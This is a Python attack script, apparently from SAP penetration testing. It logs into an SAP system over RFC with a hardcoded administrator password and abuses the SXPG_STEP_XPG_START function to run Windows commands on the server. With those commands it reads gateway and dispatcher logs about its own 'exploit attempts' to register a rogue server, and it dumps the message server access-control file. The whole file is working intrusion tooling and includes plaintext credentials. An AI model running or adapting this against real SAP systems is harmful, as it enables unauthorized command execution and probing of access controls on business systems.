#!/usr/bin/env python3
"""
investigate_w74_4.py — Read GW dev_rd for our exploit attempts, check GwHostTab
"""
import sys
sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')
from sap_rfc_ctypes import RFCConnection

SDK_PATH = '/home/joris/Desktop/nwrfc750P_18-70002752/nwrfcsdk/lib/libsapnwrfc.so'
HOST = '192.168.2.29'
SYSNR = '40'
CLIENT = '001'
USER = 'sapadm'
PASSWD = 'siroj1978'

BASE = dict(TARGET="", DESTINATION="", STDINCNTL="R", STDOUTCNTL="M",
            STDERRCNTL="M", TRACECNTL="0", TERMCNTL="C", TRACELEVEL="0",
            LONG_PARAMS="", CONNCNTL="H")

def sxpg(conn, prog, params, label):
    print(f"\n{'='*70}")
    print(f"[CMD] {label}")
    print(f"  {prog} {params}")
    print(f"{'='*70}")
    kw = dict(BASE, EXTPROG=prog, PARAMS=params)
    try:
        try:
            r = conn.call("SXPG_STEP_XPG_START", MXROW=9999, **kw)
        except Exception as e:
            if "MXROW" in str(e) or "RFC_INVALID" in str(e):
                r = conn.call("SXPG_STEP_XPG_START", **kw)
            else:
                print(f"  ERROR: {e}")
                return None
    except Exception as e:
        print(f"  ERROR: {e}")
        return None
    for row in r.get("LOG", []):
        line = (row.get("MESSAGE") or row.get("LINE") or row.get("TEXT") or "") if isinstance(row, dict) else str(row)
        line = line.rstrip()
        if line:
            print(f"  {line}")
    status = r.get("STATUS", "?")
    print(f"  [exit={status!r}]")
    return r

def main():
    print(f"[*] Connecting to W74 at {HOST}:{SYSNR}")
    with RFCConnection(sdk_path=SDK_PATH, ashost=HOST, sysnr=SYSNR,
                       client=CLIENT, user=USER, passwd=PASSWD, lang="EN") as conn:
        print("[+] Connected\n")

        # The MS log shows our registrations get MS_SERVER_ADD sent to
        # WINWAS740_W74_40 (the dispatcher). The key question is what
        # the DISPATCHER does with that MS_SERVER_ADD message.

        # Look in dev_disp for our server name
        sxpg(conn, r"C:\Windows\System32\findstr.exe",
             r'/i "ubuntu 192.168.2.210 SERVER_ADD SERVER_SUB SERVER_MOD nilist NILIST DpMsSrv DpMsAd" C:\usr\sap\W74\DVEBMGS40\work\dev_disp',
             "Search dev_disp for SERVER_ADD/ubuntu entries")

        # Read the dev_rd for our specific connection attempts
        sxpg(conn, r"C:\Windows\System32\findstr.exe",
             r'/i "192.168.2.210 ubuntu sapxpg sapserv user-host USER-HOST intern local HostTab GwHostTab gwconn" C:\usr\sap\W74\DVEBMGS40\work\dev_rd',
             "Search dev_rd for our exploit attempts")

        # Read recent GW log (should be 2026-04-12 since we've been testing today)
        sxpg(conn, r"C:\Windows\System32\cmd.exe",
             r'/c dir C:\usr\sap\W74\DVEBMGS40\work\gw_log-2026* /b',
             "List 2026 gw_log files")

        # Read the gw log for our date
        sxpg(conn, r"C:\Windows\System32\cmd.exe",
             r'/c type C:\usr\sap\W74\DVEBMGS40\work\gw_log-2026-04-12',
             "Read gw_log 2026-04-12")

        # Also try today's date (April 11)
        sxpg(conn, r"C:\Windows\System32\cmd.exe",
             r'/c type C:\usr\sap\W74\DVEBMGS40\work\gw_log-2026-04-11',
             "Read gw_log 2026-04-11")

        # Check if the dispatcher even knows about the MS SERVER_ADD
        # Look for the DpMs functions that handle server list
        sxpg(conn, r"C:\Windows\System32\findstr.exe",
             r'/i "DpMs server host dp_version dpinfo dp_info DPInfo NiList" C:\usr\sap\W74\DVEBMGS40\work\dev_disp',
             "Search dev_disp for DpMs/server functions")

        # Check the dev_rd GW startup section more carefully - look for GwHostTab
        sxpg(conn, r"C:\Windows\System32\findstr.exe",
             r'/i "GwHost GwInit GwISec GwIRead GwAddr GwLocal" C:\usr\sap\W74\DVEBMGS40\work\dev_rd',
             "Search dev_rd for GwHostTab/init entries")

        # The MS log says it resolves our IP to 'ubuntu' via hosts file.
        # Check what the disp+work does with SERVER_ADD for ubuntu
        # The key issue: does disp+work use the HOSTNAME (ubuntu) or IP
        # when checking if a server is "internal"?

        # Let's also read ms_acl_info.dat
        sxpg(conn, r"C:\Windows\System32\cmd.exe",
             r'/c type C:\usr\sap\W74\SYS\global\ms_acl_info.dat',
             "Read ms_acl_info.dat")

        # Check the GW parameters from dev_rd header more completely
        sxpg(conn, r"C:\Windows\System32\findstr.exe",
             r'/i "gw/ GW/ param" C:\usr\sap\W74\DVEBMGS40\work\dev_rd',
             "Search dev_rd for GW params")

        print("\n\n[*] Done.")

if __name__ == '__main__':
    main()
